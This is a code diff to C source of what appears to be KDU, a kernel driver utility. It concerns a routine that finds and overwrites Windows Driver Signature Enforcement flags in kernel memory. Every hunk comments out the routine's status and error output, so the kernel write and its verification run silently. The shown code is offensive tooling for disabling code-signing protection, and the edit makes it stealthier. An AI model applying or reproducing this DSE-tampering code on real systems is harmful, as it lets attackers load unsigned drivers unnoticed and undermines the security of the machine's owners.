@@ -321,8 +321,8 @@ ULONG_PTR KDUQueryVariable(
     imageLoadedBase = supGetModuleBaseByName(lpModuleName, &loadedImageSize);
     if (imageLoadedBase == 0) {
 
-        supPrintfEvent(kduEventError,
-            "[!] Abort, could not query \"%ws\" image base\r\n", lpModuleName);
+        //supPrintfEvent(kduEventError,
+        //    "[!] Abort, could not query \"%ws\" image base\r\n", lpModuleName);
 
         return 0;
     }
@@ -340,7 +340,7 @@ ULONG_PTR KDUQueryVariable(
     mappedImageBase = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
     if (mappedImageBase) {
 
-        printf_s("[+] Module \"%ws\" loaded for pattern search\r\n", lpModuleName);
+        //printf_s("[+] Module \"%ws\" loaded for pattern search\r\n", lpModuleName);
 
         if (NtBuildNumber < NT_WIN8_BLUE) {
 
@@ -376,18 +376,18 @@ ULONG_PTR KDUQueryVariable(
             }
             else {
 
-                supPrintfEvent(kduEventError,
-                    "[!] Resolved address 0x%llX does not belong required module.\r\n",
-                    kernelAddress);
+                //supPrintfEvent(kduEventError,
+                //    "[!] Resolved address 0x%llX does not belong required module.\r\n",
+                //    kernelAddress);
 
             }
 
         }
         else {
 
-            supPrintfEvent(kduEventError,
-                "[!] Failed to locate kernel variable address, NTSTATUS (0x%lX)\r\n",
-                ntStatus);
+            //supPrintfEvent(kduEventError,
+            //    "[!] Failed to locate kernel variable address, NTSTATUS (0x%lX)\r\n",
+            //    ntStatus);
 
         }
 
@@ -399,10 +399,10 @@ ULONG_PTR KDUQueryVariable(
         //
         // Output error.
         //
-        supPrintfEvent(kduEventError,
-            "[!] Could not load \"%ws\", GetLastError %lu\r\n",
-            lpModuleName,
-            GetLastError());
+        //supPrintfEvent(kduEventError,
+        //    "[!] Could not load \"%ws\", GetLastError %lu\r\n",
+        //    lpModuleName,
+        //    GetLastError());
 
     }
 
@@ -431,8 +431,8 @@ BOOL KDUControlDSE(
     variableAddress = KDUQueryVariable(Context->NtBuildNumber);
     if (variableAddress == 0) {
 
-        supPrintfEvent(kduEventError,
-            "[!] Could not query system variable address, abort.\r\n");
+        //supPrintfEvent(kduEventError,
+        //    "[!] Could not query system variable address, abort.\r\n");
 
     }
     else {
@@ -446,20 +446,20 @@ BOOL KDUControlDSE(
             sizeof(ulFlags));
 
         if (!bResult) {
-            supPrintfEvent(kduEventError,
-                "[!] Could not query DSE state, GetLastError %lu\r\n",
-                GetLastError());
+            //supPrintfEvent(kduEventError,
+            //    "[!] Could not query DSE state, GetLastError %lu\r\n",
+            //    GetLastError());
 
         }
         else {
 
-            printf_s("[+] DSE flags (0x%p) value: %lX, new value to be written: %lX\r\n",
-                (PVOID)variableAddress,
-                ulFlags,
-                DSEValue);
+            //printf_s("[+] DSE flags (0x%p) value: %lX, new value to be written: %lX\r\n",
+                //(PVOID)variableAddress,
+                //ulFlags,
+                //DSEValue);
 
             if (DSEValue == ulFlags) {
-                printf_s("[~] Warning, current value is identical to what you want to write\r\n");
+               // printf_s("[~] Warning, current value is identical to what you want to write\r\n");
             }
 
             DWORD dwLastError;
@@ -473,7 +473,7 @@ BOOL KDUControlDSE(
 
             if (bResult) {
 
-                printf_s("[+] Kernel memory write complete, verifying data\r\n");
+                //printf_s("[+] Kernel memory write complete, verifying data\r\n");
 
                 //
                 // Verify write.
@@ -490,25 +490,25 @@ BOOL KDUControlDSE(
 
                     bResult = (ulFlags == DSEValue);
 
-                    supPrintfEvent(
-                        (bResult == FALSE) ? kduEventError : kduEventInformation,
-                        "%s Write result verification %s\r\n",
-                        (bResult == FALSE) ? "[!]" : "[+]",
-                        (bResult == FALSE) ? "failed" : "succeeded");
+                    //supPrintfEvent(
+                    //    (bResult == FALSE) ? kduEventError : kduEventInformation,
+                    //    "%s Write result verification %s\r\n",
+                    //    (bResult == FALSE) ? "[!]" : "[+]",
+                    //    (bResult == FALSE) ? "failed" : "succeeded");
 
 
                 }
                 else {
-                    supPrintfEvent(kduEventError,
-                        "[!] Could not verify kernel memory write, GetLastError %lu\r\n",
-                        dwLastError);
+                    //supPrintfEvent(kduEventError,
+                    //    "[!] Could not verify kernel memory write, GetLastError %lu\r\n",
+                    //    dwLastError);
 
                 }
             }
             else {
-                supPrintfEvent(kduEventError,
-                    "[!] Error while writing to the kernel memory, GetLastError %lu\r\n",
-                    dwLastError);
+                //supPrintfEvent(kduEventError,
+                //    "[!] Error while writing to the kernel memory, GetLastError %lu\r\n",
+                //    dwLastError);
             }
 
         }
